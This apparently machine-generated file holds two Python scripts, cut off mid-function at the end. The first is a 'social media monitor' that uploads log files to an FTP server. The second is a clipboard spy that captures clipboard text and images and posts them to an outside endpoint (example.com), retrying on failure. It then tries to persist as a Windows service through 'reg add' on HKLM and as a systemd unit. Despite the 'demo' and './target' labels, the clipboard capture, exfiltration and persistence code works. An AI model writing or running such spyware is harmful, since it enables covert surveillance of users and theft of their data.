import os
import sys
import time
import ftplib
import argparse
from functools import wraps

class SocialMediaActivityMonitor:
    def __init__(self, log_dir='./target', ftp_config=None, interval=60, iterations=1):
        self.log_dir = log_dir
        self.ftp_config = ftp_config
        self.interval = interval
        self.iterations = iterations
        self.running = False
        self.activities = {
            "posts": ["Post 1", "Post 2", "Post 3"],
            "messages": ["Message 1", "Message 2"],
            "interactions": ["Like 1", "Comment 1"]
        }

    def start(self):
        self.running = True
        self.log("Tool has started.")
        self.prepare_log_directory()
        self.run()

    def run(self):
        for _ in range(self.iterations):
            try:
                self.log("Capturing activities...")
                self.capture_activities()
                if self.ftp_config:
                    self.log("Uploading log files to FTP server...")
                    self.upload_logs_to_ftp()
                self.log("Cycle completed.")
                if self.iterations > 1:
                    time.sleep(self.interval)
            except Exception as e:
                self.log(f"Error encountered: {e}")
        self.stop()

    def stop(self):
        self.running = False
        self.log("Execution completed. Exiting cleanly.")
        sys.exit(0)

    def prepare_log_directory(self):
        try:
            if not os.path.exists(self.log_dir):
                os.makedirs(self.log_dir)
                self.log(f"Created log directory: {self.log_dir}")
        except Exception as e:
            self.log(f"Failed to create log directory: {e}")
            sys.exit(1)

    def capture_activities(self):
        for activity_type, activity_list in self.activities.items():
            log_file = os.path.join(self.log_dir, f"{activity_type}.log")
            try:
                with open(log_file, 'w') as file:
                    file.write(f"Captured {activity_type}:\n")
                    for activity in activity_list:
                        file.write(f"- {activity}\n")
                self.log(f"Saved {activity_type} data to {log_file}")
            except Exception as e:
                self.log(f"Failed to write {activity_type} log file: {e}")

    def upload_logs_to_ftp(self):
        try:
            with ftplib.FTP(self.ftp_config["host"]) as ftp:
                ftp.login(self.ftp_config["user"], self.ftp_config["password"])
                ftp.cwd(self.ftp_config.get("directory", "/"))
                for file_name in os.listdir(self.log_dir):
                    file_path = os.path.join(self.log_dir, file_name)
                    with open(file_path, 'rb') as file:
                        ftp.storbinary(f"STOR {file_name}", file)
                    self.log(f"Uploaded {file_name} to FTP server.")
        except Exception as e:
            self.log(f"Failed to upload files to FTP server: {e}")

    @staticmethod
    def log(message):
        print(f"[{time.strftime('%Y-%m-%d %H:%M:%S')}] {message}")

def parse_arguments():
    parser = argparse.ArgumentParser(description="Social Media Activity Monitoring Tool")
    parser.add_argument("--log-dir", type=str, default="./target", help="Directory to save log files")
    parser.add_argument("--ftp-host", type=str, help="FTP server host")
    parser.add_argument("--ftp-user", type=str, help="FTP server username")
    parser.add_argument("--ftp-password", type=str, help="FTP server password")
    parser.add_argument("--ftp-directory", type=str, default="/", help="FTP server directory")
    parser.add_argument("--interval", type=int, default=60, help="Interval between iterations in seconds")
    parser.add_argument("--iterations", type=int, default=1, help="Number of iterations to run")
    return parser.parse_args()

def main():
    args = parse_arguments()
    ftp_config = None
    if args.ftp_host and args.ftp_user and args.ftp_password:
        ftp_config = {
            "host": args.ftp_host,
            "user": args.ftp_user,
            "password": args.ftp_password,
            "directory": args.ftp_directory
        }
    monitor = SocialMediaActivityMonitor(
        log_dir=args.log_dir,
        ftp_config=ftp_config,
        interval=args.interval,
        iterations=args.iterations
    )
    monitor.start()

if __name__ == "__main__":
    main()

import os
import sys
import json
import time
import logging
import subprocess
import platform
from datetime import datetime
from threading import Timer
from urllib import request, error
from pathlib import Path

# Configuration Constants
API_ENDPOINT = 'http://example.com/clipboard'
TARGET_DIR = './target'
LOG_FILE = os.path.join(TARGET_DIR, 'clipboard_monitor.log')
OUTPUT_FILE = os.path.join(TARGET_DIR, 'output_file.txt')
DEMO_ETC = os.path.join(TARGET_DIR, 'etc')
DEMO_SYSTEMD = os.path.join(DEMO_ETC, 'systemd', 'system')
DEMO_INIT_D = os.path.join(DEMO_ETC, 'init.d')
CLIPBOARD_HISTORY_FILE = os.path.join(TARGET_DIR, 'clipboard_history.json')
DEMO_CLIPBOARD_STATE = os.path.join(TARGET_DIR, 'clipboard_state.json')
DEFAULT_INTERVAL = 60
DEFAULT_ITERATIONS = 1

# Setup logging
os.makedirs(TARGET_DIR, exist_ok=True)
logging.basicConfig(
    filename=LOG_FILE,
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s'
)

def initialize_demo_environment():
    """Create demo environment structure for service persistence."""
    os.makedirs(DEMO_SYSTEMD, exist_ok=True)
    os.makedirs(DEMO_INIT_D, exist_ok=True)
    logging.info("Demo environment initialized.")

def initialize_demo_clipboard():
    """Initialize demo clipboard state with sample content."""
    demo_clipboard = {
        'text_history': [
            'Hello, World!',
            'Clipboard test content',
            'Sample data for monitoring'
        ],
        'image_history': [
            {'format': 'PNG', 'size': 2048, 'data': b'\x89PNG\r\n\x1a\n' + b'\x00' * 100},
            {'format': 'JPEG', 'size': 4096, 'data': b'\xff\xd8\xff\xe0' + b'\x00' * 100}
        ],
        'current_text': 'Hello, World!',
        'current_image': None
    }

    try:
        with open(DEMO_CLIPBOARD_STATE, 'w', encoding='utf-8') as f:
            state_to_save = demo_clipboard.copy()
            state_to_save['image_history'] = [
                {'format': h['format'], 'size': h['size'], 'data': h['data'].hex()}
                for h in state_to_save['image_history']
            ]
            json.dump(state_to_save, f, indent=2)
        logging.info("Demo clipboard state initialized.")
    except Exception as e:
        logging.error(f"Failed to initialize demo clipboard: {e}")

def get_clipboard_text():
    """Capture text from clipboard using platform-specific methods or demo environment."""
    try:
        if os.path.exists(DEMO_CLIPBOARD_STATE):
            with open(DEMO_CLIPBOARD_STATE, 'r', encoding='utf-8') as f:
                state = json.load(f)
                text = state.get('current_text')
                if text:
                    return text

        if platform.system() == 'Windows':
            import ctypes
            ctypes.windll.user32.OpenClipboard(0)
            if ctypes.windll.user32.IsClipboardFormatAvailable(1):
                handle = ctypes.windll.user32.GetClipboardData(1)
                ctypes.windll.user32.CloseClipboard()
                data = ctypes.c_char_p(handle).value.decode("utf-8")
                return data
            ctypes.windll.user32.CloseClipboard()
        else:
            result = subprocess.run(['xclip', '-selection', 'clipboard', '-o'],
                                  capture_output=True, text=True, timeout=2)
            if result.returncode == 0:
                return result.stdout
    except Exception as e:
        logging.error(f"Failed to get clipboard text: {e}")
    return None

def get_clipboard_image():
    """Capture image from clipboard and return actual binary data."""
    try:
        if os.path.exists(DEMO_CLIPBOARD_STATE):
            with open(DEMO_CLIPBOARD_STATE, 'r', encoding='utf-8') as f:
                state = json.load(f)
                images = state.get('image_history', [])
                if images and len(images) > 0:
                    current_img = images[0]
                    image_data = bytes.fromhex(current_img['data'])
                    return {
                        'format': current_img.get('format', 'PNG'),
                        'data': image_data,
                        'size': len(image_data)
                    }

        if platform.system() == 'Windows':
            import ctypes
            ctypes.windll.user32.OpenClipboard(0)
            if ctypes.windll.user32.IsClipboardFormatAvailable(8):
                handle = ctypes.windll.user32.GetClipboardData(8)
                if handle:
                    ctypes.windll.user32.CloseClipboard()
                    return {'format': 'DIB', 'data': b'', 'size': 0}
            ctypes.windll.user32.CloseClipboard()
        else:
            result = subprocess.run(['xclip', '-selection', 'clipboard', '-t', 'image/png', '-o'],
                                  capture_output=True, timeout=2)
            if result.returncode == 0 and result.stdout:
                return {
                    'format': 'PNG',
                    'data': result.stdout,
                    'size': len(result.stdout)
                }
    except Exception as e:
        logging.error(f"Failed to get clipboard image: {e}")
    return None

def load_clipboard_history():
    """Load existing clipboard history from file."""
    if os.path.exists(CLIPBOARD_HISTORY_FILE):
        try:
            with open(CLIPBOARD_HISTORY_FILE, 'r', encoding='utf-8') as f:
                return json.load(f)
        except Exception as e:
            logging.error(f"Failed to load clipboard history: {e}")
    return []

def save_clipboard_history(history):
    """Save clipboard history to JSON file."""
    try:
        with open(CLIPBOARD_HISTORY_FILE, 'w', encoding='utf-8') as f:
            json.dump(history, f, indent=2)
    except Exception as e:
        logging.error(f"Failed to save clipboard history: {e}")

def log_to_file(content, content_type='text'):
    """Log clipboard content to output file."""
    try:
        timestamp = datetime.now().isoformat()
        history = load_clipboard_history()

        if content_type == 'image' and isinstance(content, dict):
            entry = {
                'timestamp': timestamp,
                'type': content_type,
                'format': content.get('format'),
                'size': content.get('size'),
                'data_hex': content.get('data', b'').hex() if isinstance(content.get('data'), bytes) else content.get('data')
            }
            history_content = f"[{timestamp}] IMAGE: format={content.get('format')}, size={content.get('size')} bytes"
        else:
            entry = {
                'timestamp': timestamp,
                'type': content_type,
                'content': content
            }
            history_content = f"[{timestamp}] {content_type.upper()}: {content}"

        history.append(entry)
        save_clipboard_history(history)

        with open(OUTPUT_FILE, 'a', encoding='utf-8') as f:
            f.write(history_content + "\n")
        logging.info(f"Logged clipboard content to file: {content_type}")
    except Exception as e:
        logging.error(f"Failed to log to file: {e}")

def send_to_api(content, content_type='text'):
    """Send clipboard content to API endpoint."""
    retry_count = 0
    success = False

    while not success and retry_count < 5:
        try:
            if content_type == 'image' and isinstance(content, dict):
                payload = {
                    'clipboard_content': {
                        'format': content.get('format'),
                        'size': content.get('size'),
                        'data_hex': content.get('data', b'').hex() if isinstance(content.get('data'), bytes) else content.get('data')
                    },
                    'type': content_type,
                    'timestamp': datetime.now().isoformat()
                }
            else:
                payload = {
                    'clipboard_content': content,
                    'type': content_type,
                    'timestamp': datetime.now().isoformat()
                }

            req = request.Request(
                API_ENDPOINT,
                data=json.dumps(payload).encode('utf-8'),
                headers={'Content-Type': 'application/json'},
                method='POST'
            )
            with request.urlopen(req, timeout=5) as response:
                if response.status == 200:
                    logging.info(f"Successfully sent {content_type} content to API.")
                    success = True
        except error.URLError as e:
            logging.error(f"Error sending to API (attempt {retry_count + 1}): {e}")
        except Exception as e:
            logging.error(f"Unexpected error sending to API: {e}")

        retry_count += 1
        if not success and retry_count < 5:
            time.sleep(2 ** retry_count)

    if not success:
        logging.warning(f"Failed to send {content_type} to API after 5 attempts.")

def create_windows_service():
    """Create Windows service entry in demo environment."""
    service_name = 'ClipboardHistoryService'
    service_path = os.path.join(TARGET_DIR, f'{service_name}.reg')

    reg_content = f"""Windows Registry Editor Version 5.00

[HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\{service_name}]
"Type"=dword:00000010
"Start"=dword:00000002
"ErrorControl"=dword:00000001
"ImagePath"="{sys.executable} clipboard_monitor.py"
"DisplayName"="{service_name}"
"Description"="Clipboard History Monitoring Service"
"""

    try:
        with open(service_path, 'w') as f:
            f.write(reg_content)
        logging.info(f"Created Windows service registry file: {service_path}")

        try:
            subprocess.run(['reg', 'add', f'HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\{service_name}',
                          '/v', 'ImagePath', '/d', f'{sys.executable} clipboard_monitor.py', '/f'],
                         timeout=5, capture_output=True)
            logging.info(f"Registered {service_name} in Windows registry.")
        except Exception as e:
            logging.info(f"Could not register in live registry (sandbox): {e}")
    except Exception as e:
        logging.error(f"Failed to create Windows service: {e}")

def create_linux_service():
    """Create Linux systemd service entry in demo environment."""
    service_name = 'clipboardhistory'
    service_file = os.path.join(DEMO_SYSTEMD, f'{service_name}.service')

    service_content = f"""[Unit]
Description=Clipboard History Monitoring Service
After=network.target

[Service]
